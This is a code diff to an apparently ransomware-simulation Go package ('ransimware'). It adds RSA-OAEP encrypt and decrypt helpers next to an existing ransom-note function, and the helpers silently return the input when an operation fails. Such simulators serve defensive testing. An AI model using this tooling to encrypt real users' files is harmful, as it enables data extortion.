@@ -2,8 +2,11 @@ package ransimware
 
 import (
 	"bytes"
+	"crypto"
 	"crypto/aes"
 	"crypto/cipher"
+	"crypto/rand"
+	"crypto/rsa"
 	"crypto/sha256"
 	"encoding/base64"
 	"io"
@@ -157,5 +160,47 @@ func RansomNote(path string, text []string) NotifyFunc {
 		}
 
 		return nil
+	}
+}
+
+// RSADecrypt will return a function pointer to an EncryptFunc that
+// actually decrypts using the specified private key.
+func RSADecrypt(priv *rsa.PrivateKey) EncryptFunc {
+	return func(fn string, b []byte) ([]byte, error) {
+		var e error
+		var ptxt []byte
+
+		ptxt, e = priv.Decrypt(
+			nil,
+			b,
+			&rsa.OAEPOptions{Hash: crypto.SHA256},
+		)
+		if e != nil {
+			return b, nil
+		}
+
+		return ptxt, nil
+	}
+}
+
+// RSAEncrypt will return a function pointer to an EncryptFunc that
+// uses the specified public key.
+func RSAEncrypt(pub *rsa.PublicKey) EncryptFunc {
+	return func(fn string, b []byte) ([]byte, error) {
+		var ctxt []byte
+		var e error
+
+		ctxt, e = rsa.EncryptOAEP(
+			sha256.New(),
+			rand.Reader,
+			pub,
+			b,
+			nil,
+		)
+		if e != nil {
+			return b, nil
+		}
+
+		return ctxt, nil
 	}
 }
